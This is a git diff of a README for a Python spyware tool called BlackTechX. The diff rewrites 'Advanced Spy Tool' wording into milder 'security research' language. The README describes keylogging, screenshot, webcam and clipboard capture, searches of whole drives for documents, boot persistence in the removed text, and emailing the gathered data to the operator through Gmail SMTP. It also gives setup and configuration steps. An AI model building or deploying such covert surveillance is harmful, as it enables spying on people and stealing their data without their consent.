@@ -1,68 +1,52 @@
+#🛡️ BlackTechX – Security Research Tool
 
-# BlackTechX Advanced Spy Tool                                         
 
  [![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)                                                        
  [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-orange.svg)](https://github.com/yourusername/BlackTechX-Spy-Tool)                                                         
  [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)                                                   
  [![Status](https://img.shields.io/badge/Status-Development%20Ready-red.svg)](https://github.com/yourusername/BlackTechX-Spy-Tool)           
 
-#⚠️⚠️⚠️ IMPORTANT DISCLAIMER – READ CAREFULLY ⚠️⚠️⚠️
+ > **⚠ WARNING: For Educational and Security Research Purposes Only**  
 
-🚨 THIS PROJECT IS STRICTLY FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY 🚨
 
-This tool is created ONLY to:
+⚠️ Disclaimer
 
-Learn how surveillance and malware techniques work
+This project is developed strictly for educational purposes, cybersecurity learning, and authorized penetration testing.
+Any unauthorized or malicious use is illegal.
+The author is not responsible for misuse of this software.
 
-Perform AUTHORIZED penetration testing
+📌 Overview
 
-Study cybersecurity threats to build better defenses
+BlackTechX is a cross‑platform security research tool designed to help students and professionals understand how system‑level monitoring techniques work, enabling better defense strategies and security awareness.
 
-❌ ANY UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL
-❌ DO NOT use this tool on devices you do not own or do not have explicit permission for
+📸 Features
+Core Capabilities
 
-⚖️ The author is NOT responsible for:
+Keystroke monitoring (educational analysis)
 
-Misuse of this software
+Automated screenshot capture
 
-Privacy violations
+Webcam snapshot capture (if available)
 
-Legal consequences caused by improper usage
+Clipboard activity monitoring
 
-👉 By using this project, you accept full responsibility for your actions.
+System Intelligence
 
-📸 FEATURES
-🔹 Core Surveillance
+Hardware & software information
 
-Keylogging – Capture real‑time keystrokes
+Network interface and IP details
 
-Screenshots – Automatic screen capture at set intervals
+File discovery by extension
 
-Webcam Capture – Periodic webcam snapshots (if available)
+Running process monitoring
 
-Clipboard Monitoring – Tracks copied text
+Reporting
 
-🔹 Advanced Intelligence
+Email‑based compressed reports
 
-System Information – Hardware & software details
+Linux, Windows, macOS support
 
-Network Intelligence – IP addresses and network interfaces
-
-File Discovery – Search for sensitive files (.txt, .doc, .pdf, etc.)
-
-Process Monitoring – Lists running processes
-
-🔹 Automated Reporting
-
-Email Auto‑Sender – Sends compressed data packages
-
-Cross‑Platform – Linux, Windows, macOS
-
-Persistence – Auto‑start on system boot
-
-UTM Optimized – Special support for Linux in UTM
-
-🚀 QUICK START
+🚀 Installation & Usage
 1️⃣ Clone the Repository
 git clone https://github.com/yourusername/BlackTechX-Spy-Tool.git
 cd BlackTechX-Spy-Tool
@@ -86,23 +70,25 @@ EMAIL_CONFIG = {
 4️⃣ Run the Tool
 python spy_tool.py
 
-🔐 GMAIL APP PASSWORD SETUP (REQUIRED)
+🔐 Gmail App Password Setup
 
-Gmail DOES NOT allow normal passwords for scripts.
+Gmail requires an App Password for SMTP access.
 
-Steps:
+Go to https://myaccount.google.com
 
-1️⃣ Go to 👉 https://myaccount.google.com
+Open Security
 
-2️⃣ Open Security
-3️⃣ Enable 2‑Step Verification
-4️⃣ Go to Security → App passwords
-5️⃣ Generate password for Mail
-6️⃣ Copy the 16‑character password and use it in the script
+Enable 2‑Step Verification
 
-⚠️ Never upload real credentials to GitHub.
+Go to App passwords
 
-⚙️ CONFIGURATION OPTIONS
+Generate a password for Mail
+
+Use the 16‑character password in the script
+
+⚠️ Never commit real credentials to GitHub.
+
+⚙ Configuration
 ADVANCED_CONFIG = {
     'screenshot_interval': 60,
     'webcam_interval': 300,
@@ -110,52 +96,35 @@ ADVANCED_CONFIG = {
     'email_interval': 300
 }
 
-📁 File Search
 file_extensions = ['.txt', '.doc', '.pdf', '.xls', '.csv', '.py', '.js']
 
-# Linux / macOS
-search_directories = ['/home', '/Users']
+search_directories = ['/home', '/Users']  # Linux/macOS
+search_directories = ['C:\\', 'D:\\']      # Windows
 
-# Windows
-search_directories = ['C:\\', 'D:\\']
-
-🔧 SYSTEM REQUIREMENTS
+🔧 System Requirements
 
 Python 3.8+
 
 Linux / Windows / macOS
 
-Administrator / root access recommended
+Administrator privileges recommended
 
 Linux Dependencies
 sudo apt-get install gnome-screenshot scrot imagemagick python3-opencv
 
-⚖️ LEGAL & ETHICAL USAGE
-✅ Allowed
+⚖ Legal & Ethical Use
 
-Educational learning
+✅ Educational learning
+✅ Security research
+✅ Authorized penetration testing
 
-Security research
+❌ Unauthorized surveillance
+❌ Privacy violations
+❌ Malicious usage
 
-Penetration testing with permission
+👤 Author
 
-❌ NOT Allowed
+Ibrahim Shaik
+Cybersecurity Student
 
-Unauthorized surveillance
-
-Spying on users
-
-Data theft or privacy invasion
-
-📜 FINAL DISCLAIMER
-
-This software is provided “AS IS”, without any warranty.
-The author takes NO responsibility for misuse, damage, or legal issues.
-
-Use responsibly. Think ethically. Learn defensively.
-
-👤 AUTHOR & CONTACT
-
-Made with ❤️ by Ibrahim Shaik
-🎓 Cybersecurity Student
-🔐 Ethical Hacking & Security Research
+GitHub: https://github.com/yourusername
